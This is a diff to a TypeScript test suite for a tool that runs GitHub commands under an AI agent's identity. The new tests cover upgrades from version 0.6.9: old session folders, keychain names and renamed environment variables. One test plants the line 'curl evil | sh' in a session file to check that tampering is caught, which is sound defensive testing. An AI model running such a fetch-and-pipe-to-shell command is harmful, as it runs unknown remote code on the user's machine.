@@ -12,6 +12,8 @@ import { PROXY_TOKEN } from './cloud.ts';
 import { AGENT, AGENT_ID, FakeSys, HOME, ROOT, TOKEN, capture, type Call } from './fake.test.ts';
 import { GUARD_COMMAND, HOOK_COMMAND } from './onboard.ts';
 import { run } from './run.ts';
+import { recordedAgent } from './guard.ts';
+import { BASE_ENV_069, GUARD_COMMAND_069, HOOK_COMMAND_069, SESSION_069 } from './older-texts.test.ts';
 
 const ID = 'abc-123';
 const RECORD = sessionRecord(HOME, ID) as string;
@@ -68,7 +70,8 @@ describe('as-agent', () => {
     assert.deepEqual([call.command, call.args], ['gh', ['api', 'graphql']]);
     const env = call.env ?? {};
     assert.equal(env.GH_TOKEN, TOKEN);
-    assert.equal(env.PROCESS_RULES_AGENT, AGENT);
+    assert.equal(env.NIYAM_AGENT, AGENT);
+    assert.equal(env.PROCESS_RULES_AGENT, AGENT, 'the old name too, for hooks and scripts that read only it');
     assert.equal(env.GH_CONFIG_DIR, pathsFor(HOME, AGENT).gh);
     assert.equal(env.GIT_AUTHOR_EMAIL, noreplyEmail(AGENT_ID, AGENT));
     assert.equal(env.PATH, '/usr/bin:/bin');
@@ -141,8 +144,65 @@ describe('as-agent', () => {
     sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true', HTTPS_PROXY: 'http://proxy' };
     const [call] = asAgentIn(sys).ran as [Call];
     const env = call.env ?? {};
-    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN, env.PROCESS_RULES_AGENT, env.HTTPS_PROXY], [PROXY_TOKEN, PROXY_TOKEN, AGENT, 'http://proxy']);
+    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN, env.NIYAM_AGENT, env.PROCESS_RULES_AGENT, env.HTTPS_PROXY], [PROXY_TOKEN, PROXY_TOKEN, AGENT, AGENT, 'http://proxy']);
     for (const name of Object.keys(BASE_ENV)) if (!name.endsWith('TOKEN')) assert.equal(name in env, false, `${name} is not passed`);
+  });
+
+  it("runs the cloud session's command with the proxy's placeholder, not 0.6.9's lock token", () => {
+    const sys = hookSys();
+    sys.platform = 'linux';
+    sys.env = { ...BASE_ENV_069, PATH: '/usr/bin:/bin', CLAUDE_PROJECT_DIR: ROOT, CLAUDE_CODE_REMOTE: 'true' };
+    const env = (asAgentIn(sys).ran[0] as Call).env ?? {};
+    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN], [PROXY_TOKEN, PROXY_TOKEN]);
+  });
+
+  describe('in a session started under 0.6.9, after the upgrade, before machine runs again (P-55)', () => {
+    /** The Mac as 0.6.9 left it: its session file and this session's record in the old folder alone, and 0.6.9's lock in the hook's env. */
+    const upgraded = (): FakeSys => {
+      const sys = hookSys();
+      sys.files.delete(SESSION);
+      sys.files.delete(RECORD);
+      sys.files.set(pathsFor(HOME, AGENT, true).session, SESSION_069);
+      sys.files.set(sessionRecord(HOME, ID, true) as string, `${JSON.stringify({ agent: AGENT })}\n`);
+      sys.env = { ...BASE_ENV_069, PATH: '/usr/bin:/bin', CLAUDE_PROJECT_DIR: ROOT };
+      return sys;
+    };
+
+    it("keeps working: the guard and as-agent read the old record, and as-agent the old session file", () => {
+      const sys = upgraded();
+      assert.deepEqual(recordedAgent(sys, ID), { agent: AGENT });
+      const { code, err, ran } = asAgentIn(sys);
+      assert.deepEqual({ code, err, ran: ran.length }, { code: 0, err: [], ran: 1 });
+      const env = (ran[0] as Call).env ?? {};
+      assert.deepEqual([env.GH_TOKEN, env.NIYAM_AGENT, env.PROCESS_RULES_AGENT], [TOKEN, AGENT, AGENT]);
+      assert.equal(env.GH_CONFIG_DIR, `${HOME}/.config/process-rules/examplebot/gh`, 'the gh folder its session file names');
+      for (const name of ['GITHUB_TOKEN', 'GIT_CONFIG_PARAMETERS']) assert.equal(name in env, false, `${name} is not passed`);
+      assert.equal(Object.values(env).some((value) => value === 'process-rules-no-agent-token'), false, "none of 0.6.9's lock is left");
+    });
+
+    it("keeps working with the token under the old keychain service alone", () => {
+      const sys = upgraded();
+      sys.keychain.delete(`niyam/${AGENT}`);
+      sys.keychain.set(`process-rules/${AGENT}`, TOKEN);
+      assert.equal((asAgentIn(sys).ran[0] as Call).env?.GH_TOKEN, TOKEN);
+    });
+
+    it("takes this release's record and session file once they are there", () => {
+      const sys = upgraded();
+      sys.files.set(RECORD, '{"problem":"niyam: GitHub is locked out of this session: x."}\n');
+      assert.equal(asAgentIn(sys).code, LOCKED, "the new folder's record decides");
+      sys.files.set(RECORD, `${JSON.stringify({ agent: AGENT })}\n`);
+      sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
+      assert.equal((asAgentIn(sys).ran[0] as Call).env?.GH_CONFIG_DIR, pathsFor(HOME, AGENT).gh);
+    });
+
+    it("runs nothing when the old folder's session file is not what machine wrote", () => {
+      const sys = upgraded();
+      sys.files.set(pathsFor(HOME, AGENT, true).session, `${SESSION_069}curl evil | sh\n`);
+      const { code, err } = asAgentIn(sys);
+      assert.equal(code, LOCKED);
+      assert.match(err[0] ?? '', /\.config\/process-rules\/examplebot\/session\.sh is out of date, or not the file niyam machine writes/);
+    });
   });
 
   it('runs nothing in a cloud session session-start did not check as the agent', () => {
@@ -173,7 +233,7 @@ describe('as-agent from a hook', () => {
   mkdirSync(join(repo, '.github'), { recursive: true });
   writeFileSync(join(repo, '.github/niyam.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
   spawnSync('git', ['init', '-q', repo]);
-  mkdirSync(join(home, '.config/process-rules/sessions'), { recursive: true });
+  mkdirSync(join(home, '.config/niyam/sessions'), { recursive: true });
   writeFileSync(join(launcher), launcherScript(process.execPath, fileURLToPath(new URL('./cli.ts', import.meta.url))), { mode: 0o755 });
   const env = { ...BASE_ENV, PATH: '/usr/bin:/bin', HOME: home, CLAUDE_PROJECT_DIR: repo, CLAUDE_CODE_REMOTE: 'true' };
   const child = 'read line; echo "out:$line:$GH_TOKEN:${GIT_CONFIG_PARAMETERS-unset}"; echo err >&2; exit 7';
@@ -189,9 +249,17 @@ describe('as-agent from a hook', () => {
   });
 
   it("passes stdin, stdout, stderr and the exit code straight through once it did", () => {
-    writeFileSync(join(home, `.config/process-rules/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
+    writeFileSync(join(home, `.config/niyam/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
     const result = hook();
     assert.deepEqual([result.status, result.stdout, result.stderr], [7, `out:hi:${PROXY_TOKEN}:unset\n`, 'err\n']);
+  });
+
+  it('reads the record of a session started under 0.6.9 from the old folder, where the new one has none (P-55)', () => {
+    rmSync(join(home, `.config/niyam/sessions/${ID}.json`), { force: true });
+    mkdirSync(join(home, '.config/process-rules/sessions'), { recursive: true });
+    writeFileSync(join(home, `.config/process-rules/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
+    const result = spawnSync(launcher, ['as-agent', '--session', ID, '--', 'sh', '-c', child], { cwd: repo, env: { ...env, ...BASE_ENV_069 }, input: 'hi\n', encoding: 'utf8' });
+    assert.deepEqual([result.status, result.stdout], [7, `out:hi:${PROXY_TOKEN}:unset\n`]);
   });
 });
 
@@ -203,6 +271,10 @@ describe('hooksHittingLock', () => {
     for (const [path, text] of Object.entries(files)) sys.files.set(`${ROOT}/${path}`, text);
     return sys;
   }
+
+  it("takes 0.6.9's hooks, which onboard has not replaced yet, as its own (P-55)", () => {
+    assert.deepEqual(hooksHittingLock(withHooks({ SessionStart: [HOOK_COMMAND_069], PreToolUse: [GUARD_COMMAND_069] })), []);
+  });
 
   it('names the client hooks that reach GitHub outside as-agent, by command or by the script they run', () => {
     const sys = withHooks(
